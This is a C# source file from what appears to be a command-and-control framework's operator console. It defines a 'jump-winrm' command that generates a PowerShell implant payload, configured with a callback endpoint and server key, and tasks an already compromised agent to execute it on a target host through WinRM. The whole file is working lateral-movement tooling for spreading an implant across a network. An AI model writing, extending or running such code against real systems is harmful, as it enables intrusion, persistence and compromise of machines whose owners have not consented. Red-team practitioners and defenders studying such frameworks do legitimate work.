using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Commander.Executor;
using System.CommandLine;
using System.CommandLine.NamingConventionBinder;
using Common.Payload;
using Common;

namespace Commander.Commands
{
    public class JumpWinRMCommandOptions
    {
        public string target { get; set; }
        public string endpoint { get; set; }
        public bool debug { get; set; }

        public bool x86 { get; set; }

        public bool verbose { get; set; }


        public string serverKey { get; set; }
    }
    internal class JumpWinRMCommand : EnhancedCommand<JumpWinRMCommandOptions>
    {
        public override string Category => CommandCategory.Commander;
        public override string Description => "Using winrm to jump to the target machine";
        public override string Name => "jump-winrm";

        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;

        public override RootCommand Command => new RootCommand(this.Description)
        {
            new Argument<string>("target"),
            new Option<string>(new[] { "--endpoint", "-b" }, () => null, "EndPoint to Bind To"),
            new Option<string>(new[] { "--serverKey", "-k" }, () => null, "The server unique key of the endpoint"),
            new Option(new[] { "--x86", "-x86" }, "Generate a x86 architecture executable"),
            new Option(new[] { "--verbose", "-v" }, "Show details of the command execution."),
        };

        protected override async Task<bool> HandleCommand(CommandContext<JumpWinRMCommandOptions> context)
        {
            var agent = context.Executor.CurrentAgent;
            if (string.IsNullOrEmpty(context.Options.endpoint))
            {
                context.Terminal.WriteLine($"No Endpoint selected, taking the current agent enpoint ({agent.Metadata.EndPoint})");
                context.Options.endpoint = agent.Metadata.EndPoint;
            }

            var endpoint = ConnexionUrl.FromString(context.Options.endpoint);
            if (!endpoint.IsValid)
            {
                context.Terminal.WriteError($"[X] EndPoint is not valid !");
                return false;
            }

            context.Terminal.WriteLine($"[>] Generating powershell payload...");

            var options = new PayloadGenerationOptions()
            {
                Architecture = context.Options.x86 ? PayloadArchitecture.x86 : PayloadArchitecture.x64,
                Endpoint = endpoint,
                IsDebug = context.Options.debug,
                IsVerbose = context.Options.verbose,
                ServerKey = string.IsNullOrEmpty(context.Options.serverKey) ? context.Config.ServerConfig.Key : context.Options.serverKey,
                Type = PayloadType.PowerShell
            };

            var pay = context.GeneratePayloadAndDisplay(options, context.Options.verbose);

            if (pay == null)
            {
                context.Terminal.WriteError($"[X] Generation Failed!");
                return false;
            }
            else
                context.Terminal.WriteSuccess($"[+] Generation succeed!");

            await context.CommModule.TaskAgent(context.CommandLabel, Guid.NewGuid().ToString(), context.Executor.CurrentAgent.Metadata.Id, "winrm", $"{context.Options.target} \"{Encoding.UTF8.GetString(pay)}\"");

            context.Terminal.WriteSuccess($"[+] Task sent to agent!");

            return true;
        }
    }
}
